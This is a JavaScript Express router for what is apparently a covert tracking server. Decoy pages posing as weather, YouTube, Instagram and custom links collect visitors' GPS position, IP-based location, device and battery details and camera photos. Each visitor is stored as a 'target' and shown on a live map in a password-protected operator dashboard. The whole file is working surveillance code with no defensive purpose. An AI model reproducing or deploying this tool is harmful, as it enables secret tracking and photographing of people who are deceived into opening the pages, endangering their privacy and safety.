const express = require("express")
const router = express.Router()
const config = require("./config")

const TARGETS = {}

function extractClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp;
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) return xForwardedFor.split(',')[0].trim();
    return req.ip || (req.socket ? req.socket.remoteAddress : '') || '';
}

async function getIpInfo(ip) {
    const isLocal = !ip || ip.includes('127.0.0.1') || ip.includes('::1') || ip === '::ffff:127.0.0.1';
    
    // For local requests, fetch public server IP info via ipwho.is
    if (isLocal) {
        try {
            const res = await fetch(`https://ipwho.is/`);
            if (res.ok) {
                const data = await res.json();
                if (data.success) {
                    return {
                        ip: data.ip || '127.0.0.1',
                        city: data.city || 'Local Network',
                        region: data.region || 'Development',
                        country: data.country || 'Localhost',
                        lat: data.latitude,
                        lng: data.longitude,
                        isp: (data.connection && data.connection.isp) || 'Internal Loopback'
                    };
                }
            }
        } catch (e) {}
    }

    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,query`);
        if (res.ok) {
            const data = await res.json();
            if (data.status === 'success') {
                return {
                    ip: data.query,
                    city: data.city,
                    region: data.regionName,
                    country: data.country,
                    lat: data.lat,
                    lng: data.lon,
                    isp: data.isp
                };
            }
        }
    } catch (e) {}

    try {
        const res2 = await fetch(`https://ipapi.co/${ip}/json/`);
        if (res2.ok) {
            const data2 = await res2.json();
            return {
                ip: data2.ip || ip,
                city: data2.city || 'Cellular Location',
                region: data2.region || '',
                country: data2.country_name || '',
                lat: data2.latitude,
                lng: data2.longitude,
                isp: data2.org || data2.asn || 'Cellular Network'
            };
        }
    } catch (e) {}

    try {
        const res3 = await fetch(`https://ipwho.is/${ip}`);
        if (res3.ok) {
            const data3 = await res3.json();
            if (data3.success) {
                return {
                    ip: data3.ip || ip,
                    city: data3.city || 'Cellular Location',
                    region: data3.region || '',
                    country: data3.country || '',
                    lat: data3.latitude,
                    lng: data3.longitude,
                    isp: (data3.connection && data3.connection.isp) || 'Mobile ISP Network'
                };
            }
        }
    } catch (e) {}

    return {
        ip: ip,
        city: 'Cellular Location',
        region: '',
        country: '',
        isp: 'Mobile ISP Network'
    };
}

function updateTargetTelemetry(id, payload) {
    if (!id) return null;

    const ipLat = (payload.ipLocation && payload.ipLocation.lat) ? payload.ipLocation.lat : 0;
    const ipLng = (payload.ipLocation && payload.ipLocation.lng) ? payload.ipLocation.lng : 0;

    const isIncomingGps = payload.locationType === 'GPS' || (payload.accuracy && payload.accuracy < 1000);
    const resolvedLat = (payload.lat !== null && payload.lat !== undefined && payload.lat !== 0) ? payload.lat : ipLat;
    const resolvedLng = (payload.lng !== null && payload.lng !== undefined && payload.lng !== 0) ? payload.lng : ipLng;

    if (!TARGETS[id]) {
        TARGETS[id] = {
            id: id,
            lat: resolvedLat,
            lng: resolvedLng,
            accuracy: payload.accuracy || (isIncomingGps ? 10 : 5000),
            locationType: isIncomingGps ? 'GPS' : 'IP',
            speed: payload.speed || 0,
            heading: payload.heading || 0,
            battery: payload.battery || null,
            device: payload.device || null,
            ipLocation: payload.ipLocation || null,
            photos: [],
            lastSeen: Date.now(),
            template: payload.template || 'weather'
        };
        if (global.IO) {
            global.IO.emit("user-connected", id);
        }
    } else {
        if (resolvedLat !== 0 && resolvedLng !== 0) {
            const currentIsIp = TARGETS[id].locationType === 'IP' || TARGETS[id].accuracy >= 4000;
            if (isIncomingGps || currentIsIp || (payload.accuracy && payload.accuracy <= TARGETS[id].accuracy)) {
                TARGETS[id].lat = resolvedLat;
                TARGETS[id].lng = resolvedLng;
                TARGETS[id].accuracy = payload.accuracy || (isIncomingGps ? 10 : 5000);
                TARGETS[id].locationType = isIncomingGps ? 'GPS' : 'IP';
            }
        }
        if (payload.speed !== undefined && payload.speed !== null) TARGETS[id].speed = payload.speed;
        if (payload.heading !== undefined && payload.heading !== null) TARGETS[id].heading = payload.heading;
        if (payload.battery) TARGETS[id].battery = payload.battery;
        if (payload.device) TARGETS[id].device = payload.device;
        if (payload.ipLocation) TARGETS[id].ipLocation = payload.ipLocation;
        if (payload.template) TARGETS[id].template = payload.template;
        TARGETS[id].lastSeen = Date.now();
    }

    if (payload.photo) {
        if (!TARGETS[id].photos) TARGETS[id].photos = [];
        if (TARGETS[id].photos.length === 0 || TARGETS[id].photos[0].data !== payload.photo) {
            TARGETS[id].photos.unshift({
                id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
                data: payload.photo,
                timestamp: Date.now()
            });
            if (TARGETS[id].photos.length > 30) {
                TARGETS[id].photos.pop();
            }
        }
    }

    if (global.IO) {
        global.IO.emit("map-data", { id: id, target: TARGETS[id], lat: TARGETS[id].lat, lng: TARGETS[id].lng });
    }

    return TARGETS[id];
}

// Login route
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body

    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
    }

    res.redirect("/")
})

// Decoy & Telemetry ingestion routes
router.route("/weather").get((req, res) => {
    res.render("weather")
}).post(async (req, res) => {
    const clientIp = extractClientIp(req);
    if (!req.body.ipLocation || !req.body.ipLocation.ip) {
        req.body.ipLocation = await getIpInfo(clientIp);
    }
    updateTargetTelemetry(req.body.id, req.body)
    res.send("OK")
})

router.route("/youtube").get((req, res) => {
    res.render("youtube")
})
router.route("/yt").get((req, res) => {
    res.render("youtube")
})

router.route("/instagram").get((req, res) => {
    res.render("instagram")
})

router.route("/ig").get((req, res) => {
    res.render("instagram")
})

router.route("/custom").get((req, res) => {
    res.render("custom")
})
router.route("/c").get((req, res) => {
    res.render("custom")
})

router.route("/link").get((req, res) => {
    res.render("link")
})
router.route("/l").get((req, res) => {
    res.render("link")
})

router.route("/api/telemetry").post(async (req, res) => {
    const clientIp = extractClientIp(req);
    if (!req.body.ipLocation || !req.body.ipLocation.ip) {
        req.body.ipLocation = await getIpInfo(clientIp);
    }
    const target = updateTargetTelemetry(req.body.id, req.body)
    res.json({ status: "OK", target })
})

// Token verification middleware
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token

    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

// Target Management APIs
router.get("/api/targets", (req, res) => {
    res.json(TARGETS)
})

router.get("/api/targets/:id", (req, res) => {
    res.json(TARGETS[req.params.id] || null)
})

router.delete("/api/targets/:id", (req, res) => {
    if (TARGETS[req.params.id]) {
        delete TARGETS[req.params.id]
        if (global.IO) global.IO.emit("user-disconnected", req.params.id)
    }
    res.json({ success: true })
})

router.route("/").get((req, res) => {
    res.render("home", {
        TARGETS
    })
})

router.route("/map").get((req, res) => {
    const { id } = req.query
    const target = TARGETS[id]
    res.render("map", {
        data: JSON.stringify(target ? [target.lat, target.lng] : [0, 0])
    })
})

module.exports = router